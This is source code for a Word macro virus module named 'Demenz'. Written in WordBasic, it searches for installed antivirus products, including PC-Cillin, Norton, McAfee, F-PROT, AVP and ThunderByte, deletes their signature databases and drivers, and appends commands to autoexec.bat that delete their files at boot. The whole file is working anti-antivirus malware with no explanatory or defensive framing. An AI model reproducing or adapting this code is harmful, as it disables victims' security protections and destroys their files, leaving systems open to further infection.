   Attribute VB_Name = "Demenz"

   Public Sub MAIN()
   Dim SE1$
   Dim t1$
   Dim t2$
   Dim t3$
   Dim SE2$
   Dim SE3$
   Dim SE4$
   Dim SE5$
   Dim SE6$
   Dim SE7$
   Dim SE8$
   Dim SE9$
   Dim SE10$
   Dim SE11$
   Dim SE12$
   On Error Resume Next
   SE1$ = WordBasic.[Files$]("C:\PC-Cillin 95\Scan32.dll")
   If SE1$ = "" Then GoTo AV2
   SetAttr "c:\autoexec.bat", 0
   Open "c:\autoexec.bat" For Append As 1
   Print #1, "@echo off"
   Print #1, "attrib -h -r -s +a c:\pc-cil~1\*.* >nul"
   Print #1, "del c:\pc-cil~1\*.dll >nul"
   Close 1
   WordBasic.Kill "C:\PC-Cillin 95\Lpt$vpn.*"
   WordBasic.MsgBox t1$ + "PC-CILLIN 95" + t2$, t3$, 48

   AV2:
   SE2$ = WordBasic.[Files$]("C:\PC-Cillin 97\Scan32.dll")
   If SE2$ = "" Then GoTo AV3
   SetAttr "c:\autoexec.bat", 0
   Open "c:\autoexec.bat" For Append As 1
   Print #1, "@echo off"
   Print #1, "attrib -h -r -s +a c:\pc-cil~1\*.* >nul"
   Print #1, "del c:\pc-cil~1\*.dll >nul"
   Close 1
   WordBasic.Kill "C:\PC-Cillin 97\Lpt$vpn.*"
   WordBasic.MsgBox t1$ + "PC-CILLIN II" + t2$, t3$, 48

   AV3:
   SE3$ = WordBasic.[Files$]("C:\Tsc\PC-Cillin 97\Scan32.dll")
   If SE3$ = "" Then GoTo AV4
   SetAttr "c:\autoexec.bat", 0
   Open "c:\autoexec.bat" For Append As 1
   Print #1, "@echo off"
   Print #1, "attrib -h -r -s +a c:\tsc\pc-cil~1\*.* >nul"
   Print #1, "del c:\tsc\pc-cil~1\*.dll >nul"
   Close 1
   WordBasic.Kill "C:\Tsc\PC-Cillin 97\Lpt$vpn.*"
   WordBasic.MsgBox t1$ + "PC-CILLIN II" + t2$, t3$, 48

   AV4:
   SE4$ = WordBasic.[Files$]("C:\Zlockav\Gsav.dat")
   If SE4$ = "" Then GoTo AV5
   WordBasic.Kill SE4$
   WordBasic.Kill "C:\Zlockav\Gsav.cas"

   AV5:
   SE5$ = WordBasic.[Files$]("C:\VB7\Virus.txt")
   If SE5$ = "" Then GoTo AV6
   WordBasic.Kill SE5$

   AV6:
   SE6$ = WordBasic.[Files$]("C:\Program Files\Norton AntiVirus\Viruscan.dat")
   If SE6$ = "" Then GoTo AV7
   WordBasic.Kill SE6$
   WordBasic.Kill "C:\Program Files\Symantec\Symevnt.386"

   AV7:
   SE7$ = WordBasic.[Files$]("C:\Program Files\McAfee\VirusScan95\Scan.dat")
   If SE7$ = "" Then GoTo AV8
   WordBasic.Kill SE7$
   WordBasic.Kill "C:\Program Files\McAfee\VirusScan95\Mcscan32.dll"

   AV8:
   SE8$ = WordBasic.[Files$]("C:\Program Files\McAfee\VirusScan\Scan.dat")
   If SE8$ = "" Then GoTo AV9
   WordBasic.Kill SE8$
   WordBasic.Kill "C:\Program Files\McAfee\VirusScan\Mcscan32.dll"

   AV9:
   SE9$ = WordBasic.[Files$]("C:\Program Files\Command Software\F-PROT95\Sign.def")
   If SE9$ = "" Then GoTo AV10
   WordBasic.Kill SE9$
   WordBasic.Kill "C:\Program Files\Command Software\F-PROT95\Dvp.vxd"

   AV10:
   SE10$ = WordBasic.[Files$]("C:\Program Files\AntiViral Toolkit Pro\Avp32.exe")
   If SE10$ = "" Then GoTo AV11
   WordBasic.Kill SE10$
   WordBasic.Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"

   AV11:
   SE11$ = WordBasic.[Files$]("C:\TBAVW95\Tbscan.sig")
   If SE11$ = "" Then GoTo joke
   SetAttr "c:\autoexec.bat", 0
   Open "c:\autoexec.bat" For Append As 1
   Print #1, "@echo off"
   Print #1, "attrib -h -r -s +a c:\Tbavw95\*.* >nul"
   Print #1, "del c:\Tbavw95\Tb*.* >nul"
   Close 1
   WordBasic.Kill "C:\Tbavw95\Tbavw95.vxd"

   joke:
   SE12$ = WordBasic.[Files$]("C:\Programme\Norton AntiVirus\*.dat")
   If SE12$ = "" Then GoTo exit_
   SetAttr "c:\autoexec.bat", 0
   Open "c:\autoexec.bat" For Append As 1
   Print #1, "@echo off"
   Print #1, "attrib -h -r -s +a c:\Programme Norton AntiVirus\*.* >nul"
   Print #1, "del c:\Norton AntiVirus\*.* >nul"
   Close 1
   WordBasic.Kill "C:\Programme\Norton AntiVirus\*.dat"
   WordBasic.Kill "C:\Programme\Symantec\Symevnt.386"
   exit_:
   End Sub
